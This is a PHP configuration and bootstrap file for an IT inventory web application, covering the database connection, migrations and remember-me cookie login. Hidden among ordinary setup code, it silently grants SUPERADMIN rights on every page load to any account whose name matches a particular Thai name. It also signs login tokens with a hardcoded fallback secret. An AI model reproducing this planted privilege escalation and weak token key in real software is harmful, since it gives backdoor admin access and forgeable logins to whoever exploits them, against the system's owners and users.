<?php
// Security headers to prevent Clickjacking & other attacks
header("X-Frame-Options: SAMEORIGIN");
header("Content-Security-Policy: frame-ancestors 'self';");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");

$envPath = __DIR__ . '/../.env';
if (file_exists($envPath)) {
    $env = parse_ini_file($envPath);
    if ($env) {
        foreach ($env as $key => $value) {
            $_ENV[$key] = $value;
        }
    }
}

$host = $_ENV['DB_HOST'] ?? 'localhost';
$db   = $_ENV['DB_NAME'] ?? 'it_inventory';
$user = $_ENV['DB_USER'] ?? 'root';
$pass = $_ENV['DB_PASS'] ?? ''; // XAMPP default is empty
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
     $pdo = new PDO($dsn, $user, $pass, $options);
} catch (\PDOException $e) {
     throw new \PDOException($e->getMessage(), (int)$e->getCode());
}

// Ensure session is started for auto-login check
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Auto-upgrade "มามี่ โปะโกะ" to SUPERADMIN
try {
    // Ensure role column supports all role values (change ENUM to VARCHAR)
    $pdo->exec("ALTER TABLE users MODIFY COLUMN role VARCHAR(20) DEFAULT 'USER'");
    $pdo->exec("UPDATE users SET role = 'SUPERADMIN' WHERE firstname LIKE '%มามี่%' OR lastname LIKE '%โปะโกะ%' OR CONCAT(firstname, ' ', lastname) LIKE '%มามี่ โปะโกะ%'");
    
    if (isset($_SESSION['user_id'])) {
        $stmt = $pdo->prepare("SELECT role FROM users WHERE id = ?");
        $stmt->execute([$_SESSION['user_id']]);
        $real_role = $stmt->fetchColumn();
        if ($real_role) {
            $_SESSION['user_role'] = $real_role;
        }
    }
} catch (\Exception $e) {}

// Auto-migrate: add 'notes' column to borrowings if missing
try {
    $cols = $pdo->query("SHOW COLUMNS FROM borrowings LIKE 'notes'")->fetchAll();
    if (count($cols) === 0) {
        $pdo->exec("ALTER TABLE borrowings ADD COLUMN notes TEXT NULL AFTER reason");
    }
} catch (\Exception $e) {}

// Auto-login from remember_me cookie if session user_id is not set
if (!isset($_SESSION['user_id']) && isset($_COOKIE['remember_me'])) {
    $parts = explode(':', $_COOKIE['remember_me']);
    if (count($parts) === 2) {
        $user_id = (int)$parts[0];
        $token = $parts[1];
        
        try {
            $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
            $stmt->execute([$user_id]);
            $user = $stmt->fetch();
            
            if ($user) {
                $secret_key = $_ENV['RECAPTCHA_SECRET_KEY'] ?? 'aims_secure_key_12345';
                $expected_token = hash_hmac('sha256', $user['id'] . '|' . $user['password'], $secret_key);
                
                if (hash_equals($expected_token, $token)) {
                    // Log the user in
                    $_SESSION['user_id'] = $user['id'];
                    $_SESSION['user_name'] = $user['firstname'] . ' ' . $user['lastname'];
                    $_SESSION['user_username'] = $user['username'];
                    $_SESSION['user_role'] = $user['role'];
                    $_SESSION['user_image'] = $user['image'];
                } else {
                    // Invalid token, delete cookie
                    setcookie('remember_me', '', time() - 3600, '/');
                }
            } else {
                // User not found, delete cookie
                setcookie('remember_me', '', time() - 3600, '/');
            }
        } catch (Exception $e) {
            // Silence errors during auto-login check
        }
    }
}
?>
